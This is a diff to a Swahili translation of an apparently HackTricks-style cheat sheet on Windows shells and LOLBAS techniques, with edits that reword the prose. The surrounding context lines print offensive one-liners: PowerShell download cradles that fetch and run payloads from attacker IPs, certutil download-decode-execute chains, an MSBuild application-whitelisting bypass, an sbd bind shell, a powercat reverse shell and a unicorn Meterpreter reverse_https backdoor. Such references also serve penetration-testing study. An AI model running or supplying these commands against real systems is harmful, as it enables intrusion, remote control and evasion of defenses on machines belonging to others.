@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 ## Lolbas
 
 Ukurasa [lolbas-project.github.io](https://lolbas-project.github.io/) ni wa Windows kama [https://gtfobins.github.io/](https://gtfobins.github.io/) ni wa linux.\
-Kwa wazi, **hakuna faili za SUID au ruhusa za sudo katika Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binaries** zinaweza kutumika (kuhujumu) kufanya aina fulani ya vitendo visivyotarajiwa kama **kutekeleza msimbo wa kawaida.**
+Kwa wazi, **hakuna faili za SUID au ruhusa za sudo katika Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binaries** zinaweza (kutumika vibaya) kutekeleza aina fulani ya vitendo visivyotarajiwa kama **kutelezesha msimbo wa kawaida.**
 
 ## NC
 ```bash
@@ -39,7 +39,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat unaoweza kubebeka na salama**. Inafanya kazi kwenye mifumo ya Unix kama na Win32. Pamoja na vipengele kama vile usimbaji wa nguvu, utekelezaji wa programu, bandari za chanzo zinazoweza kubadilishwa, na kuunganishwa tena mara kwa mara, sbd inatoa suluhisho la kubadilika kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka kwa usambazaji wa Kali Linux linaweza kutumika kama mbadala wa kuaminika wa Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat unaoweza kubebeka na salama**. Inafanya kazi kwenye mifumo ya Unix kama na Win32. Ikiwa na vipengele kama vile usimbaji wa nguvu, utekelezaji wa programu, bandari za chanzo zinazoweza kubadilishwa, na kuunganishwa tena mara kwa mara, sbd inatoa suluhisho la kubadilika kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka kwa usambazaji wa Kali Linux linaweza kutumika kama mbadala wa kuaminika wa Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -94,7 +94,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Mchakato unaofanya wito wa mtandao: **powershell.exe**\
-Payload imeandikwa kwenye diski: **HAPANA** (_angalau mahali popote ningeweza kupata kwa kutumia procmon !_ )
+Payload imeandikwa kwenye diski: **HAPANA** (_angalau mahali popote ambapo ningeweza kupata kwa kutumia procmon !_ )
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -274,7 +274,7 @@ Pakua B64dll, ikode na uitekeleze.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Pakua B64exe, ibadilishe na uifanye kazi.
+Pakua B64exe, ikode na uiendeshe.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -338,7 +338,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**Haikutambuliwa**
+**Haijatambuliwa**
 
 **Unaweza kupakua na kutekeleza kwa urahisi Koadic zombie ukitumia stager wmic**
 
@@ -348,7 +348,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Unaweza kutumia mbinu hii kupita Application Whitelisting na vizuizi vya Powershell.exe. Kama utavyoonyeshwa na PS shell.\
+Unaweza kutumia mbinu hii kupita Application Whitelisting na vizuizi vya Powershell.exe. Kwa hivyo utaonyeshwa na PS shell.\
 Pakua hii na uifanye: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -436,7 +436,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Unda launcher ya powershell, ihifadhi kwenye faili na uipakue na kuitekeleze.
+Unda launcher ya powershell, ihifadhi kwenye faili na uipakue na kuitekeleza.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -446,7 +446,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Unda toleo la powershell la backdoor ya metasploit ukitumia unicorn
+Unda toleo la powershell la backdoor ya metasploit kwa kutumia unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -454,7 +454,7 @@ Anza msfconsole na rasilimali iliyoundwa:
 ```
 msfconsole -r unicorn.rc
 ```
-Anza seva ya wavuti inayotoa faili _powershell\_attack.txt_ na uendeshe kwenye mwathirika:
+Anza seva ya wavuti inayotoa faili _powershell\_attack.txt_ na uifanye kwenye mwathiriwa:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -487,7 +487,7 @@ Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
 * **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki hila za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
